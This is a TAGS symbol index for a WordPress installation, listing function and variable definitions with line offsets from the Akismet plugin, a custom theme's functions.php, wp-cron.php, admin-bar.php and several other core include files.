	$comment = $commentdata;comment320,11986
	$akismet_nonce_option = apply_filters( 'akismet_comment_nonce', get_option( 'akismet_comment_nonce' ) );akismet_nonce_option333,12499
	if ( $akismet_nonce_option == 'true' || $akismet_nonce_option == '' ) {akismet_nonce_option335,12654
	foreach ($_POST as $key => $value ) {key349,13263
	$ignore = array( 'HTTP_COOKIE', 'HTTP_COOKIE2', 'PHP_AUTH_PW' );ignore354,13370
	foreach ( $_SERVER as $key => $value ) {key356,13437
	$post = get_post( $comment['comment_post_ID'] );post363,13603
	$query_string = '';query_string366,13723
	foreach ( $comment as $key => $data )key367,13744
	$response = akismet_http_post($query_string, $akismet_api_host, '/1.1/comment-check', $akismet_api_port);response372,13909
		$last_updated = strtotime( $post->post_modified_gmt );last_updated381,14309
		$diff = time() - $last_updated;diff382,14366
		$diff = $diff / 86400;diff383,14400
			if ( $incr = apply_filters('akismet_spam_count_incr', 1) )incr387,14630
	$akismet_last_comment = $commentdata;akismet_last_comment412,15629
function akismet_delete_old() {akismet_delete_old420,15796
	$now_gmt = current_time('mysql', 1);now_gmt422,15843
	$comment_ids = $wpdb->get_col("SELECT comment_id FROM $wpdb->comments WHERE DATE_SUB('$now_gmt', INTERVAL 15 DAY) > comment_date_gmt AND comment_approved = 'spam'");comment_ids423,15881
	$comma_comment_ids = implode( ', ', array_map('intval', $comment_ids) );comma_comment_ids427,16091
	$n = mt_rand(1, 5000);n433,16431
function akismet_delete_old_metadata() { akismet_delete_old_metadata439,16585
	$now_gmt = current_time( 'mysql', 1 ); now_gmt442,16644
	$interval = apply_filters( 'akismet_delete_commentmeta_interval', 15 );interval443,16685
	$interval = absint( $interval );interval446,16788
		$comment_ids = $wpdb->get_col( "SELECT $wpdb->comments.comment_id FROM $wpdb->commentmeta INNER JOIN $wpdb->comments USING(comment_id) WHERE meta_key = 'akismet_as_submitted' AND DATE_SUB('$now_gmt', INTERVAL {$interval} DAY) > comment_date_gmt LIMIT 10000" ); comment_ids454,17001
	$n = mt_rand( 1, 5000 ); n466,17435
	if ( apply_filters( 'akismet_optimize_table', ( $n == 11 ), 'commentmeta' ) ) { // lucky number n467,17462
function akismet_check_db_comment( $id, $recheck_reason = 'recheck_queue' ) {akismet_check_db_comment476,17762
function akismet_check_db_comment( $id, $recheck_reason = 'recheck_queue' ) {recheck_reason476,17762
    $id = (int) $id;id479,17897
    $c = $wpdb->get_row( "SELECT * FROM $wpdb->comments WHERE comment_ID = '$id'", ARRAY_A );c480,17918
    $id = $c['comment_ID'];id491,18357
    $query_string = '';query_string496,18481
    foreach ( $c as $key => $data )key497,18505
    $response = akismet_http_post($query_string, $akismet_api_host, '/1.1/comment-check', $akismet_api_port);response500,18616
function akismet_cron_recheck() {akismet_cron_recheck504,18754
	$status = akismet_verify_key( akismet_get_key() );status507,18804
	if ( get_option( 'akismet_alert_code' ) || $status == 'invalid' ) {status508,18856
	$comment_errors = $wpdb->get_col( "comment_errors516,19162
		$comment = get_comment( $comment_id );comment525,19475
		$status = akismet_check_db_comment( $comment_id, 'retry' );status532,19745
		$msg = '';msg534,19808
		if ( $status == 'true' ) {status535,19821
			$msg = __( 'Akismet caught this comment as spam during an automatic retry.' );msg536,19850
		} elseif ( $status == 'false' ) {status537,19932
			$msg = __( 'Akismet cleared this comment during an automatic retry.' );msg538,19968
			$comment = get_comment( $comment_id );comment549,20577
				if ( $status == 'true' ) {status551,20696
				} elseif ( $status == 'false' ) {status553,20764
	$remaining = $wpdb->get_var( $wpdb->prepare( "SELECT COUNT(*) FROM $wpdb->commentmeta WHERE meta_key = 'akismet_error'" ) );remaining568,21456
function akismet_add_comment_nonce( $post_id ) {akismet_add_comment_nonce575,21813
$akismet_comment_nonce_option = apply_filters( 'akismet_comment_nonce', get_option( 'akismet_comment_nonce' ) );akismet_comment_nonce_option581,22003
if ( $akismet_comment_nonce_option == 'true' || $akismet_comment_nonce_option == '' )akismet_comment_nonce_option583,22117
function akismet_fix_scheduled_recheck() {akismet_fix_scheduled_recheck593,22440
	$future_check = wp_next_scheduled( 'akismet_schedule_cron_recheck' );future_check594,22483
	$check_range = time() + 1200;check_range603,22656

wordpress/wp-content/plugins/akismet/index.php,0

wordpress/wp-content/plugins/akismet/legacy.php,4930
function akismet_spam_comments( $type = false, $page = 1, $per_page = 50 ) {akismet_spam_comments3,7
function akismet_spam_comments( $type = false, $page = 1, $per_page = 50 ) {type3,7
	$page = (int) $page;page6,100
		$page = 1;page8,140
	$per_page = (int) $per_page;per_page10,154
		$per_page = 50;per_page12,206
	$start = ( $page - 1 ) * $per_page;start14,225
	$end = $start + $per_page;end15,262
			$type = '';type19,358
			$type = $wpdb->escape( $type );type21,380
function akismet_spam_totals() {akismet_spam_totals31,807
	$totals = $wpdb->get_results( "SELECT comment_type, COUNT(*) AS cc FROM $wpdb->comments WHERE comment_approved = 'spam' GROUP BY comment_type" );totals33,855
	$return = array();return34,1002
function akismet_manage_page() {akismet_manage_page40,1154
	$count = sprintf(__('Akismet Spam (%s)'), akismet_spam_count());count47,1315
function akismet_caught() {akismet_caught54,1715
		$i = 0;i63,2128
			$comment = (int) $comment;comment65,2182
		$to = add_query_arg( 'recovered', $i, $_SERVER['HTTP_REFERER'] );to73,2488
		$delete_time = $wpdb->escape( $_POST['display_time'] );delete_time82,2835
		$comment_ids = $wpdb->get_col( "SELECT comment_id FROM $wpdb->comments WHERE comment_approved = 'spam' AND '$delete_time' > comment_date_gmt" );comment_ids83,2893
		$to = add_query_arg( 'deleted', 'all', $_SERVER['HTTP_REFERER'] );to89,3291
	$i = (int) $_GET['recovered'];i95,3436
	$link = 'edit-comments.php';link103,3731
	$link = 'edit.php';link105,3766
$count = get_option( 'akismet_spam_count' );count150,4486
$spam_count = akismet_spam_count();spam_count157,4703
	$s = $wpdb->escape($_POST['s']);s182,6219
	$comments = $wpdb->get_results("SELECT * FROM $wpdb->comments  WHEREcomments183,6253
		$page = (int) $_GET['apage'];page193,6608
		$page = 1;page195,6646
		$page = 1;page198,6678
	$current_type = false;current_type200,6692
		$current_type = preg_replace( '|[^a-z]|', '', $_GET['ctype'] );current_type202,6748
	$comments = akismet_spam_comments( $current_type, $page );comments204,6815
	$total = akismet_spam_count( $current_type );total205,6875
	$totals = akismet_spam_totals();totals206,6922
foreach ( $totals as $type => $type_count ) {type211,7136
		$type = 'comments';type213,7211
		$show = __('Comments');show214,7233
		$show = ucwords( $type );show216,7269
	$type_count = number_format_i18n( $type_count );type_count218,7300
	$extra = $current_type === $type ? ' class="active"' : '';extra219,7350
$total_pages = ceil( $total / 50 );total_pages235,8025
$r = '';r236,8061
if ( ( $total_pages = ceil( $total / 50 ) ) > 1 ) {total_pages241,8267
	for ( $page_num = 1; $page_num <= $total_pages; $page_num++ ) :page_num242,8319
		if ( $page == $page_num ) :page243,8384
			$p = false;p246,8465
				$in = true;in250,8764
			elseif ( $in == true ) :in251,8780
				$in = false;in253,8827
$i = 0;i271,9418
	$comment_date = mysql2date(get_option("date_format") . " @ " . get_option("time_format"), $comment->comment_date);comment_date274,9466
	$post = get_post($comment->comment_post_ID);post275,9582
	$post_title = $post->post_title;post_title276,9628
	if ($i % 2) $class = 'class="alternate"';class277,9662
	else $class = '';class278,9705
$post = get_post($comment->comment_post_ID);post290,10514
$post_title = wp_specialchars( $post->post_title, 'double' );post_title291,10559
$post_title = ('' == $post_title) ? "# $comment->comment_post_ID" : $post_title;post_title292,10621
$total_pages = ceil( $total / 50 );total_pages302,10889
$r = '';r303,10925
if ( ( $total_pages = ceil( $total / 50 ) ) > 1 ) {total_pages308,11131
	for ( $page_num = 1; $page_num <= $total_pages; $page_num++ ) :page_num309,11183
		if ( $page == $page_num ) :page310,11248
			$p = false;p313,11329
				$in = true;in317,11628
			elseif ( $in == true ) :in318,11644
				$in = false;in320,11691
function redirect_old_akismet_urls( ) {redirect_old_akismet_urls358,12934
	$script_name = array_pop( split( '/', $_SERVER['PHP_SELF'] ) );script_name360,12998
	$page = '';page362,13064
		$page = $_GET['page'];page364,13109
		$new_url = esc_url( 'edit-comments.php?comment_status=spam' );new_url368,13335
	function akismet_recheck_button( $page ) {akismet_recheck_button379,13583
			$link = 'edit-comments.php';link382,13694
			$link = 'edit.php';link384,13733
		$button = "<a href='$link?page=akismet-admin&amp;recheckqueue=true&amp;noheader=true' style='display: block; width: 100px; position: absolute; right: 7%; padding: 5px; font-size: 14px; text-decoration: underline; background: #fff; border: 1px solid #ccc;'>" . __('Recheck Queue for Spam') . "</a>";button385,13756
		$page = str_replace( '<div class="wrap">', '<div class="wrap">' . $button, $page );page386,14057
function akismet_kill_proxy_check( $option ) { return 0; }akismet_kill_proxy_check395,14354

wordpress/wp-content/plugins/akismet/widget.php,535
class Akismet_Widget extends WP_Widget {Akismet_Widget5,34
	function __construct() {__construct7,76
	function css() {css19,390
	function form( $instance ) {form62,1274
			$title = esc_attr( $instance['title'] );title64,1325
			$title = __( 'Spam Blocked' );title67,1382
	function update( $new_instance, $old_instance ) {update79,1720
	function widget( $args, $instance ) {widget84,1856
		$count = get_option( 'akismet_spam_count' );count85,1895
function akismet_register_widgets() {akismet_register_widgets104,2481

wordpress/wp-content/plugins/hello.php,430
function hello_dolly_get_lyric() {hello_dolly_get_lyric15,518
	$lyrics = "Hello, Dollylyrics17,597
	$lyrics = explode( "\n", $lyrics );lyrics47,1444
function hello_dolly() {hello_dolly54,1652
	$chosen = hello_dolly_get_lyric();chosen55,1677
// Now we set that function up to execute when the admin_notices action is calledup59,1751
function dolly_css() {dolly_css63,1926
	$x = is_rtl() ? 'left' : 'right';x65,2031

wordpress/wp-content/plugins/index.php,0

wordpress/wp-content/themes/index.php,0

wordpress/wp-content/themes/toessay-theme/404.php,0

wordpress/wp-content/themes/toessay-theme/archive.php,87
    <?php $post = $posts[0]; // Hack. Set $post so that the_date() works. ?>post5,53

wordpress/wp-content/themes/toessay-theme/comments.php,0

wordpress/wp-content/themes/toessay-theme/footer.php,0

wordpress/wp-content/themes/toessay-theme/functions.php,6906
function sight_setup() {sight_setup8,116
if ( is_admin() && isset($_GET['activated'] ) && $pagenow == 'themes.php' ) {pagenow18,473
    $menu_id1 = wp_create_nav_menu('Navigation');menu_id126,730
    $menu_id2 = wp_create_nav_menu('Top menu');menu_id227,780
class extended_walker extends Walker_Nav_Menu{extended_walker32,917
	function display_element( $element, &$children_elements, $max_depth, $depth=0, $args, &$output ) {display_element33,964
	function display_element( $element, &$children_elements, $max_depth, $depth=0, $args, &$output ) {depth33,964
		$id_field = $this->db_fields['id'];id_field38,1096
		//Adds the 'parent' class to the current item if it has childrento44,1273
		$cb_args = array_merge( array(&$output, $element, $depth), $args);cb_args48,1443
		$id = $element->$id_field;id52,1575
					$newlevel = true;newlevel60,1862
					$cb_args = array_merge( array(&$output, $depth), $args);cb_args62,1918
			$cb_args = array_merge( array(&$output, $depth), $args);cb_args72,2267
		$cb_args = array_merge( array(&$output, $element, $depth), $args);cb_args77,2414
$prefix = 'sgt_';prefix84,2569
$meta_box = array(meta_box86,2588
function sight_add_box() {sight_add_box103,2968
// Callback function to show fields in meta boxto109,3158
function sight_show_box() {sight_show_box110,3206
        $meta = get_post_meta($post->ID, $field['id'], true);meta120,3537
function sight_save_data($post_id) {sight_save_data136,4040
        $old = get_post_meta($post_id, $field['id'], true);old159,4638
        $new = $_POST[$field['id']];new160,4698
function options_admin_menu() {options_admin_menu172,4970
function options_page() {options_page178,5238
function options_update() {options_update230,8555
class GetConnected extends WP_Widget {GetConnected256,9397
    function GetConnected() {GetConnected258,9437
        parent::WP_Widget(false, $name = 'Sight Social Links');name259,9467
    function widget($args, $instance) {widget262,9538
        $title = apply_filters('widget_title', $instance['title']);title264,9604
    function update($new_instance, $old_instance) {update362,14183
        $instance = $old_instance;instance363,14235
    function form($instance) {form389,15503
        $title = esc_attr($instance['title']);title391,15535
class Recentposts_thumbnail extends WP_Widget {Recentposts_thumbnail509,22974
    function Recentposts_thumbnail() {Recentposts_thumbnail511,23023
        parent::WP_Widget(false, $name = 'Sight Recent Posts');name512,23062
    function widget($args, $instance) {widget515,23133
        $title = apply_filters('widget_title', $instance['title']);title517,23199
                if (get_option('rpthumb_qty')) $rpthumb_qty = get_option('rpthumb_qty'); else $rpthumb_qty = 5;rpthumb_qty524,23494
                $q_args = array(q_args525,23606
                $rpthumb_posts = get_posts($q_args);rpthumb_posts528,23709
                        $offset = 'style="padding-left: 65px;"';offset536,24100
    function update($new_instance, $old_instance) {update549,24553
        $instance = $old_instance;instance550,24605
    function form($instance) {form557,24864
        $title = esc_attr($instance['title']);title558,24895
function commentslist($comment, $args, $depth) {commentslist571,25768
function feedcount($feedurl='http://feeds.feedburner.com/wpshower') {feedcount604,27175
    $feedid = explode('/', $feedurl);feedid605,27245
    $feedid = end($feedid);feedid606,27283
    $twodayago = date('Y-m-d', strtotime('-2 days', time()));twodayago607,27311
    $onedayago = date('Y-m-d', strtotime('-1 days', time()));onedayago608,27373
    $today = date('Y-m-d');today609,27435
    $api = "https://feedburner.google.com/api/awareness/1.0/GetFeedData?uri=$feedid&dates=$twodayago,$onedayago";api611,27464
    $ch = curl_init();ch614,27611
    $data = curl_exec($ch);data617,27724
    $base_code = curl_getinfo($ch);base_code618,27752
        $burner_count_circulation = 'This feed does not permit Awareness API access';burner_count_circulation622,27851
        $burner_date = $today;burner_date623,27937
        $xml = new SimpleXMLElement($data); //Parse XML via SimpleXML Classxml626,27982
        $bis = $xml->attributes();  //Bis Contain first attribute, It usually is ok or fail in FeedBurnerbis627,28058
                    $burner_count_circulation = $feed->entry[0]['circulation'];burner_count_circulation632,28292
                    $burner_date  =  $feed->entry[0]['date'];burner_date633,28372
                    $burner_count_circulation = $feed->entry[1]['circulation'];burner_count_circulation635,28459
                    $burner_date  =  $feed->entry[1]['date'];burner_date636,28539
                    $burner_count_circulation = 'Feed Not Found';burner_count_circulation644,28736
                    $burner_count_circulation = 'Missing required parameter (URI)';burner_count_circulation647,28853
                    $burner_count_circulation = 'Malformed parameter (DATES)';burner_count_circulation650,28988
            $burner_date = $today;burner_date653,29108
function twittercount($twitter_url='http://twitter.com/wpshower') {twittercount664,29371
    $twitterid = explode('/', $twitter_url);twitterid665,29439
    $twitterid = end($twitterid);twitterid666,29484
    $xml = @simplexml_load_file("http://twitter.com/users/show.xml?screen_name=$twitterid");xml667,29518
function seo_title() {seo_title671,29646
    $sep = " | "; # delimitersep673,29695
    $newtitle = get_bloginfo('name'); # default titlenewtitle674,29725
        $newtitle = single_post_title("", false);newtitle678,29869
        $newtitle = single_cat_title("", false);newtitle682,29997
     $newtitle = single_tag_title("", false);newtitle686,30119
     $newtitle = "Search Result " . $s;newtitle690,30240
        $curr_tax = get_taxonomy(get_query_var('taxonomy'));curr_tax694,30356
        $curr_term = get_term_by('slug', get_query_var('term'), get_query_var('taxonomy')); # current term datacurr_term695,30417
            $newtitle = $curr_tax->label . $sep . $curr_term->name;newtitle698,30586
            $newtitle = $curr_tax->label;newtitle700,30671
        $newtitle = get_bloginfo('name') . $sep . get_bloginfo('description');newtitle710,30961
function new_excerpt_length($length) {new_excerpt_length718,31169
function getTinyUrl($url) {getTinyUrl724,31277
    $tinyurl = file_get_contents("http://tinyurl.com/api-create.php?url=".$url);tinyurl725,31305
function smart_excerpt($string, $limit) {smart_excerpt729,31410
    $words = explode(" ",$string);words730,31452
    if ( count($words) >= $limit) $dots = '...';dots731,31487
function comments_link_attributes(){comments_link_attributes735,31598
function next_posts_attributes(){next_posts_attributes740,31754

wordpress/wp-content/themes/toessay-theme/header.php,0

wordpress/wp-content/themes/toessay-theme/index.php,0

wordpress/wp-content/themes/toessay-theme/loop.php,0

wordpress/wp-content/themes/toessay-theme/page.php,0

wordpress/wp-content/themes/toessay-theme/pagination.php,0

wordpress/wp-content/themes/toessay-theme/search.php,0

wordpress/wp-content/themes/toessay-theme/searchform.php,0

wordpress/wp-content/themes/toessay-theme/sidebar.php,48
        $widget_args = array(widget_args3,108

wordpress/wp-content/themes/toessay-theme/single.php,498
                    $prev_post = get_adjacent_post(false, '', true);prev_post26,2046
                    $next_post = get_adjacent_post(false, '', false); ?>next_post27,2116
                    <?php if ($prev_post) : $prev_post_url = get_permalink($prev_post->ID); $prev_post_title = $prev_post->post_title; ?>prev_post_url28,2190
                    <?php if ($next_post) : $next_post_url = get_permalink($next_post->ID); $next_post_title = $next_post->post_title; ?>next_post_url31,2520

wordpress/wp-content/themes/toessay-theme/slideshow.php,143
    $args = array(args2,6
    $slides = get_posts($args);slides7,130
    if ( !empty($slides) ) : $exl_posts = Array(); ?>exl_posts9,163

wordpress/wp-cron.php,1108
define('DOING_CRON', true);DOING_CRON22,486
function _get_cron_lock() {_get_cron_lock30,655
	$value = 0;value33,728
		$value = wp_cache_get( 'doing_cron', 'transient', true );value37,891
		$row = $wpdb->get_row( $wpdb->prepare( "SELECT option_value FROM $wpdb->options WHERE option_name = %s LIMIT 1", '_transient_doing_cron' ) );row39,961
			$value = $row->option_value;value41,1132
if ( false === $crons = _get_cron_array() )crons47,1187
$keys = array_keys( $crons );keys50,1240
$local_time = microtime( true );local_time51,1270
$doing_cron_transient = get_transient( 'doing_cron');doing_cron_transient56,1362
		$doing_cron_transient = $doing_wp_cron = sprintf( '%.22F', microtime( true ) );doing_cron_transient64,1762
		$doing_wp_cron = $_GET[ 'doing_wp_cron' ];doing_wp_cron67,1903
foreach ( $crons as $timestamp => $cronhooks ) {timestamp75,2025
	foreach ( $cronhooks as $hook => $keys ) {hook79,2117
		foreach ( $keys as $k => $v ) {k81,2162
			$schedule = $v['schedule'];schedule83,2197
				$new_args = array($timestamp, $schedule, $hook, $v['args']);new_args86,2260

wordpress/wp-includes/admin-bar.php,6219
 * To hide the admin bar, you're looking in the wrong place. Unhooking this function will notwill11,188
function _wp_admin_bar_init() {_wp_admin_bar_init18,492
	/* Load the admin bar class code ready for instantiation */code24,598
	$admin_bar_class = apply_filters( 'wp_admin_bar_class', 'WP_Admin_Bar' );admin_bar_class28,750
		$wp_admin_bar = new $admin_bar_class;wp_admin_bar30,866
function wp_admin_bar_render() {wp_admin_bar_render52,1610
function wp_admin_bar_wp_menu( $wp_admin_bar ) {wp_admin_bar_wp_menu74,2109
function wp_admin_bar_my_account_item( $wp_admin_bar ) {wp_admin_bar_my_account_item132,3574
	$user_id      = get_current_user_id();user_id133,3631
	$current_user = wp_get_current_user();current_user134,3671
	$profile_url  = get_edit_profile_url( $user_id );profile_url135,3711
	$avatar = get_avatar( $user_id, 16 );avatar140,3793
	$howdy  = sprintf( __('Howdy, %1$s'), $current_user->display_name );howdy141,3832
	$class  = empty( $avatar ) ? '' : 'with-avatar';class142,3902
function wp_admin_bar_my_account_menu( $wp_admin_bar ) {wp_admin_bar_my_account_menu161,4283
	$user_id      = get_current_user_id();user_id162,4340
	$current_user = wp_get_current_user();current_user163,4380
	$profile_url  = get_edit_profile_url( $user_id );profile_url164,4420
	$user_info  = get_avatar( $user_id, 64 );user_info174,4601
function wp_admin_bar_site_menu( $wp_admin_bar ) {wp_admin_bar_site_menu208,5452
	$blogname = get_bloginfo('name');blogname219,5753
		$blogname = preg_replace( '#^(https?://)?(www.)?#', '', get_home_url() );blogname222,5816
		$blogname = sprintf( __('Network Admin: %s'), esc_html( $current_site->site_name ) );blogname225,5922
		$blogname = sprintf( __('Global Dashboard: %s'), esc_html( $current_site->site_name ) );blogname227,6042
	$title = wp_html_excerpt( $blogname, 40 );title230,6137
		$title = trim( $title ) . '&hellip;';title232,6209
function wp_admin_bar_my_sites_menu( $wp_admin_bar ) {wp_admin_bar_my_sites_menu279,7351
	$blue_wp_logo_url = includes_url('images/wpmini-blue.png');blue_wp_logo_url344,9091
		$blavatar = '<img src="' . esc_url($blue_wp_logo_url) . '" alt="' . esc_attr__( 'Blavatar' ) . '" width="16" height="16" class="blavatar"/>';blavatar349,9427
		$blogname = empty( $blog->blogname ) ? $blog->domain : $blog->blogname;blogname351,9572
		$menu_id  = 'blog-' . $blog->userblog_id;menu_id352,9646
function wp_admin_bar_shortlink_menu( $wp_admin_bar ) {wp_admin_bar_shortlink_menu397,10823
	$short = wp_get_shortlink( 0, 'query' );short398,10879
	$id = 'get-shortlink';id399,10921
	$html = '<input class="shortlink-input" type="text" readonly="readonly" value="' . esc_attr( $short ) . '" />';html404,10981
function wp_admin_bar_edit_menu( $wp_admin_bar ) {wp_admin_bar_edit_menu419,11314
		$current_screen = get_current_screen();current_screen423,11423
			&& ( $post_type_object = get_post_type_object( $post->post_type ) )post_type_object427,11544
			&& ( $tax = get_taxonomy( $tag->taxonomy ) )tax438,11976
		$current_object = $wp_the_query->get_queried_object();current_object448,12202
			&& ( $post_type_object = get_post_type_object( $current_object->post_type ) )post_type_object454,12351
			&& ( $tax = get_taxonomy( $current_object->taxonomy ) )tax464,12824
function wp_admin_bar_new_content_menu( $wp_admin_bar ) {wp_admin_bar_new_content_menu482,13208
	$actions = array();actions483,13266
	$cpts = (array) get_post_types( array( 'show_in_admin_bar' => true ), 'objects' );cpts485,13288
		$key = 'post-new.php?post_type=' . $cpt->name;key508,14217
	$title = '<span class="ab-icon"></span><span class="ab-label">' . _x( 'New', 'admin bar menu group label' ) . '</span>';title518,14556
	foreach ( $actions as $link => $action ) {link529,14915
function wp_admin_bar_comments_menu( $wp_admin_bar ) {wp_admin_bar_comments_menu546,15251
	$awaiting_mod = wp_count_comments();awaiting_mod550,15357
	$awaiting_mod = $awaiting_mod->moderated;awaiting_mod551,15395
	$awaiting_title = esc_attr( sprintf( _n( '%s comment awaiting moderation', '%s comments awaiting moderation', $awaiting_mod ), number_format_i18n( $awaiting_mod ) ) );awaiting_title552,15438
	$icon  = '<span class="ab-icon"></span>';icon554,15608
	$title = '<span id="ab-awaiting-mod" class="ab-label awaiting-mod pending-count count-' . $awaiting_mod . '">' . number_format_i18n( $awaiting_mod ) . '</span>';title555,15651
function wp_admin_bar_appearance_menu( $wp_admin_bar ) {wp_admin_bar_appearance_menu570,16090
	$current_url = ( is_ssl() ? 'https://' : 'http://' ) . $_SERVER['HTTP_HOST'] . $_SERVER['REQUEST_URI'];current_url579,16526
function wp_admin_bar_updates_menu( $wp_admin_bar ) {wp_admin_bar_updates_menu609,17938
	$update_data = wp_get_update_data();update_data611,17993
	$title = '<span class="ab-icon"></span><span class="ab-label">' . number_format_i18n( $update_data['counts']['total'] ) . '</span>';title616,18084
function wp_admin_bar_search_menu( $wp_admin_bar ) {wp_admin_bar_search_menu633,18468
	$form  = '<form action="' . esc_url( home_url( '/' ) ) . '" method="get" id="adminbarsearch">';form637,18551
function wp_admin_bar_add_secondary_groups( $wp_admin_bar ) {wp_admin_bar_add_secondary_groups658,19138
function wp_admin_bar_header() { ?>wp_admin_bar_header681,19564
function _admin_bar_bump_cb() { ?>_admin_bar_bump_cb692,19745
 * This can be called immediately upon plugin load. It does not need to be called from a function hooked to the init action.hooked703,19973
function show_admin_bar( $show ) {show_admin_bar710,20201
	$show_admin_bar = (bool) $show;show_admin_bar712,20261
function is_admin_bar_showing() {is_admin_bar_showing722,20438
			$show_admin_bar = false;show_admin_bar735,20870
			$show_admin_bar = _get_admin_bar_pref();show_admin_bar737,20909
	$show_admin_bar = apply_filters( 'show_admin_bar', $show_admin_bar );show_admin_bar741,20961
function _get_admin_bar_pref( $context = 'front', $user = 0 ) {_get_admin_bar_pref757,21451
function _get_admin_bar_pref( $context = 'front', $user = 0 ) {context757,21451
	$pref = get_user_option( "show_admin_bar_{$context}", $user );pref758,21515

wordpress/wp-includes/atomlib.php,5845
class AtomFeed {AtomFeed18,281
    var $links = array();links24,359
    var $links = array();links24,359
    var $categories = array();categories30,466
    var $categories = array();categories30,466
    var $entries = array();entries37,564
    var $entries = array();entries37,564
class AtomEntry {AtomEntry45,672
    var $links = array();links51,751
    var $links = array();links51,751
    var $categories = array();categories57,855
    var $categories = array();categories57,855
class AtomParser {AtomParser65,947
    var $NS = 'http://www.w3.org/2005/Atom';NS67,967
    var $NS = 'http://www.w3.org/2005/Atom';NS67,967
    var $ATOM_CONTENT_ELEMENTS = array('content','summary','title','subtitle','rights');ATOM_CONTENT_ELEMENTS68,1012
    var $ATOM_CONTENT_ELEMENTS = array('content','summary','title','subtitle','rights');ATOM_CONTENT_ELEMENTS68,1012
    var $ATOM_SIMPLE_ELEMENTS = array('id','updated','published','draft');ATOM_SIMPLE_ELEMENTS69,1101
    var $ATOM_SIMPLE_ELEMENTS = array('id','updated','published','draft');ATOM_SIMPLE_ELEMENTS69,1101
    var $debug = false;debug71,1177
    var $debug = false;debug71,1177
    var $depth = 0;depth73,1202
    var $depth = 0;depth73,1202
    var $indent = 2;indent74,1222
    var $indent = 2;indent74,1222
    var $in_content;in_content75,1243
    var $ns_contexts = array();ns_contexts76,1264
    var $ns_contexts = array();ns_contexts76,1264
    var $ns_decls = array();ns_decls77,1296
    var $ns_decls = array();ns_decls77,1296
    var $content_ns_decls = array();content_ns_decls78,1325
    var $content_ns_decls = array();content_ns_decls78,1325
    var $content_ns_contexts = array();content_ns_contexts79,1362
    var $content_ns_contexts = array();content_ns_contexts79,1362
    var $is_xhtml = false;is_xhtml80,1402
    var $is_xhtml = false;is_xhtml80,1402
    var $is_html = false;is_html81,1429
    var $is_html = false;is_html81,1429
    var $is_text = true;is_text82,1455
    var $is_text = true;is_text82,1455
    var $skipped_div = false;skipped_div83,1480
    var $skipped_div = false;skipped_div83,1480
    var $FILE = "php://input";FILE85,1511
    var $FILE = "php://input";FILE85,1511
    var $feed;feed87,1543
    var $current;current88,1558
    function AtomParser() {AtomParser90,1577
        $this->feed = new AtomFeed();feed92,1606
        $this->current = null;current93,1644
        $this->map_attrs_func = create_function('$k,$v', 'return "$k=\"$v\"";');map_attrs_func94,1675
        $this->map_xmlns_func = create_function('$p,$n', '$xd = "xmlns"; if(strlen($n[0])>0) $xd .= ":{$n[0]}"; return "{$xd}=\"{$n[1]}\"";');map_xmlns_func95,1756
    function _p($msg) {_p98,1906
    function error_handler($log_level, $log_text, $error_file, $error_line) {error_handler104,2052
        $this->error = $log_text;error105,2130
    function parse() {parse108,2171
        $parser = xml_parser_create_ns();parser114,2308
        $this->content = '';content124,2837
        $ret = true;ret126,2867
        $fp = fopen($this->FILE, "r");fp128,2889
                $ret = false;ret136,3292
    function start_element($parser, $name, $attrs) {start_element149,3488
        $tag = array_pop(split(":", $name));tag151,3542
                $this->current = $this->feed;current155,3650
                $this->current = new AtomEntry();current158,3758
            $this->content_ns_decls = array();content_ns_decls172,4125
            $attrs_prefix = array();attrs_prefix177,4355
            foreach($attrs as $key => $value) {key180,4440
                $with_prefix = $this->ns_to_prefix($key, true);with_prefix181,4488
            $attrs_str = join(' ', array_map($this->map_attrs_func, array_keys($attrs_prefix), array_values($attrs_prefix)));attrs_str185,4643
                $attrs_str = " " . $attrs_str;attrs_str187,4810
            $with_prefix = $this->ns_to_prefix($name);with_prefix190,4872
            $xmlns_str = '';xmlns_str196,5079
                    $xmlns_str = " " . $xmlns_str;xmlns_str201,5453
            $this->in_content = array();in_content208,5777
            $this->is_xhtml = $attrs['type'] == 'xhtml';is_xhtml209,5818
            $this->is_html = $attrs['type'] == 'html' || $attrs['type'] == 'text/html';is_html210,5875
            $this->is_text = !in_array('type',array_keys($attrs)) || $attrs['type'] == 'text';is_text211,5963
            $type = $this->is_xhtml ? 'XHTML' : ($this->is_html ? 'HTML' : ($this->is_text ? 'TEXT' : $attrs['type']));type212,6058
        $this->ns_decls = array();ns_decls225,6596
    function end_element($parser, $name) {end_element228,6638
        $tag = array_pop(split(":", $name));tag230,6682
        $ccount = count($this->in_content);ccount232,6728
                $origtype = $this->in_content[0][2];origtype240,7097
                $newcontent = array();newcontent242,7198
                $this->in_content = array();in_content259,7968
                $endtag = $this->ns_to_prefix($name);endtag265,8337
            $this->current = null;current276,8682
    function start_ns($parser, $prefix, $uri) {start_ns282,8778
    function end_ns($parser, $prefix) {end_ns287,8947
    function cdata($parser, $data) {cdata291,9042
    function _default($parser, $data) {_default298,9276
    function ns_to_prefix($qname, $attr=false) {ns_to_prefix303,9362
    function ns_to_prefix($qname, $attr=false) {attr303,9362
        $components = split(":", $qname);components305,9508
        $name = array_pop($components);name308,9591
            $ns = join(":",$components);ns312,9717
    function is_declared_content_ns($new_mapping) {is_declared_content_ns335,10421
    function xml_escape($string)xml_escape346,10726

wordpress/wp-includes/author-template.php,4248
function get_the_author($deprecated = '') {get_the_author23,518
 * The behavior of this function is based off of old functionality predatingis35,823
 * get_the_author(). This function is not deprecated, but is designed to echois36,900
 * The normal, expected behavior of this function is to echo the author and notis40,1139
function the_author( $deprecated = '', $deprecated_echo = true ) {the_author51,1606
function the_author( $deprecated = '', $deprecated_echo = true ) {deprecated51,1606
function get_the_modified_author() {get_the_modified_author71,2402
	if ( $last_id = get_post_meta($post->ID, '_edit_last', true) ) {last_id73,2454
		$last_user = get_userdata($last_id);last_user74,2520
function the_modified_author() {the_modified_author86,2833
function get_the_author_meta( $field = '', $user_id = false ) {get_the_author_meta99,3318
function get_the_author_meta( $field = '', $user_id = false ) {field99,3318
		$user_id = isset( $authordata->ID ) ? $authordata->ID : 0;user_id102,3425
		$authordata = get_userdata( $user_id );authordata104,3496
		$field = 'user_' . $field;field108,3665
	$value = isset( $authordata->$field ) ? $authordata->$field : '';value110,3695
function the_author_meta($field = '', $user_id = false) {the_author_meta123,4170
function the_author_meta($field = '', $user_id = false) {user_id123,4170
function get_the_author_link() {get_the_author_link136,4550
function the_author_link() {the_author_link154,5131
function get_the_author_posts() {get_the_author_posts166,5419
function the_author_posts() {the_author_posts178,5745
 * reason for this, is that another function is used to help in printing theis186,5968
function the_author_posts_link($deprecated = '') {the_author_posts_link196,6323
	$link = sprintf(link203,6523
